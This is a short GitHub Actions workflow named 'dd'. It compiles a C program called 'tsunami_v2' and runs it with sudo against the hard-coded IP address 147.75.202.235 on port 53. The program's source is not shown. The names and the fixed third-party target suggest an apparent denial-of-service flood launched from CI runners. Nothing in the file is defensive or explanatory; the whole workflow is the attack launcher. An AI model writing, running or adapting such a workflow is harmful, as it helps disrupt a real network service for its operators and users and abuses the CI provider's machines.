name: dd
on: workflow_dispatch
jobs:
  dd:
    runs-on: ubuntu-24.04-arm
    steps:
      - uses: actions/checkout@v6
      - run: clang -O3 -flto -march=native -o tsunami_v2 tsunami_v2.c -pthread
      - run: sudo ./tsunami_v2 147.75.202.235 53
